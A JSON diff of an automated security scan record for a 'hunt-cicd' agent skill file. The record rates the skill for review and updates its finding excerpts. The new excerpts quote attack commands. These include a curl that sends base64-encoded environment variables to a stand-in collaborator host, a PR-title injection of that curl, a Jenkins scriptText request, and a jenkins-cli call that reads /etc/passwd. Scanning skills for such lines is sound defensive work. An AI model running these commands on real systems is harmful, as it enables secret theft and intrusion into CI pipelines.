@@ -8,22 +8,14 @@
   "stars": 30,
   "category": "devops",
   "commit": "2984de11956e413008c6f98121cd141c499e47a3",
-  "contentHash": "1d0f5c0299fa7c0cc8df8f8ebbc1759a76dc3a33346d00745b6062c120dd1830",
+  "contentHash": "4b4226db210c47327f31acc13688dac0e094e12ebd7067e84361d558f65469b7",
   "repoCreatedAt": "2026-05-25T19:06:03Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": false,
-  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scannedAt": "2026-11-08T09:45:03.483Z",
   "scan": {
     "findings": [
-      {
-        "ruleId": "shell",
-        "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
-        "line": 63,
-        "excerpt": "# Fingerprint — the X-Jenkins header leaks the exact version (drives CVE selection)",
-        "disclosed": true,
-        "automatic": false
-      },
       {
         "ruleId": "network",
         "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
@@ -34,6 +26,14 @@
         "hosts": [
           "$target"
         ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
+        "line": 64,
+        "excerpt": "curl -sI \"https://$TARGET/\" | grep -iE \"x-jenkins|x-hudson\"",
+        "disclosed": true,
+        "automatic": false
       },
       {
         "ruleId": "network",
@@ -58,14 +58,6 @@
         ]
       },
       {
-        "ruleId": "shell",
-        "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
-        "line": 74,
-        "excerpt": "# This must return uid=...(jenkins). If it returns the Jenkins login HTML or a",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
         "ruleId": "network",
         "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
         "line": 76,
@@ -79,8 +71,16 @@
       {
         "ruleId": "shell",
         "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
-        "line": 95,
-        "excerpt": "# Download the matching jenkins-cli.jar from /jnlpJars/jenkins-cli.jar first.",
+        "line": 76,
+        "excerpt": "curl -s -X POST \"https://$TARGET/scriptText\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
+        "line": 96,
+        "excerpt": "java -jar jenkins-cli.jar -s \"https://$TARGET/\" -http connect-node \"@/etc/passwd\"",
         "disclosed": true,
         "automatic": false
       },
@@ -96,6 +96,14 @@
         ]
       },
       {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
+        "line": 131,
+        "excerpt": "PR title:  foo\\n      curl https://x.<COLLAB>/?d=$(printenv | base64 -w0)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
         "ruleId": "network",
         "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
         "line": 131,
@@ -107,10 +115,10 @@
         ]
       },
       {
-        "ruleId": "shell",
+        "ruleId": "reads-secrets",
         "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
-        "line": 136,
-        "excerpt": "# in attacker's PR, e.g. package.json preinstall or Makefile:",
+        "line": 137,
+        "excerpt": "curl -s \"https://x.<COLLAB>/?env=$(printenv | base64 -w0)\"",
         "disclosed": true,
         "automatic": false
       },
@@ -124,6 +132,14 @@
         "hosts": [
           "x."
         ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
+        "line": 137,
+        "excerpt": "curl -s \"https://x.<COLLAB>/?env=$(printenv | base64 -w0)\"",
+        "disclosed": true,
+        "automatic": false
       },
       {
         "ruleId": "shell",
@@ -167,8 +183,8 @@
       {
         "ruleId": "shell",
         "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
-        "line": 159,
-        "excerpt": "# Enumerate org workflows that use the dangerous triggers",
+        "line": 160,
+        "excerpt": "gh api graphql -f query='{organization(login:\"ORG\"){repositories(first:100){nodes{name}}}}' \\",
         "disclosed": true,
         "automatic": false
       },
@@ -183,16 +199,8 @@
       {
         "ruleId": "shell",
         "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
-        "line": 180,
-        "excerpt": "# Public-repo run logs frequently contain secrets printed BEFORE ::add-mask:: took effect,",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
-        "line": 198,
-        "excerpt": "# Runner registration token → register an attacker runner that picks up jobs (and their secrets).",
+        "line": 182,
+        "excerpt": "gh api \"repos/ORG/REPO/actions/runs\" | jq -r '.workflow_runs[:20][].id' | while read id; do",
         "disclosed": true,
         "automatic": false
       },
@@ -206,6 +214,14 @@
         "hosts": [
           "$target"
         ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
+        "line": 200,
+        "excerpt": "curl -s \"https://$TARGET/api/v4/projects/PID/variables\" -H \"PRIVATE-TOKEN: $TOK\"   # masked? protected?",
+        "disclosed": true,
+        "automatic": false
       },
       {
         "ruleId": "network",
@@ -232,8 +248,8 @@
       {
         "ruleId": "shell",
         "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
-        "line": 214,
-        "excerpt": "# Probe common public-bucket/path patterns (parameterize $T and $ORG)",
+        "line": 215,
+        "excerpt": "for U in \\",
         "disclosed": true,
         "automatic": false
       },
@@ -255,31 +271,23 @@
         "automatic": false
       },
       {
-        "ruleId": "reads-secrets",
-        "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
-        "line": 278,
-        "excerpt": "- **Actions injection:** confirm the data flow into a sink first (FP section). Blind step → **Collaborator callback with the runner's source IP** is mandatory. ",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
         "ruleId": "shell",
         "file": "plugins/agentic-awesome-skills/skills/hunt-cicd/SKILL.md",
-        "line": 307,
-        "excerpt": "# Read-only first step; confirm scope before anything active.",
+        "line": 308,
+        "excerpt": "cat scope.txt  # target list from the authorized engagement brief",
         "disclosed": true,
         "automatic": false
       }
     ],
     "findingTotals": {
-      "shell": 12,
       "network": 13,
-      "downloads-code": 1,
-      "reads-secrets": 1
+      "shell": 12,
+      "reads-secrets": 2,
+      "downloads-code": 1
     },
     "score": 69,
     "band": "review",
-    "rulesVersion": "1.0.0",
+    "rulesVersion": "1.3.0",
     "filesScanned": 2,
     "filesSkipped": 0
   },
@@ -289,6 +297,12 @@
       "scannedAt": "2026-11-06T19:07:48.007Z",
       "score": 69,
       "rulesVersion": "1.0.0"
+    },
+    {
+      "commit": "2984de11956e413008c6f98121cd141c499e47a3",
+      "scannedAt": "2026-11-08T09:45:03.483Z",
+      "score": 69,
+      "rulesVersion": "1.3.0"
     }
   ]
 }
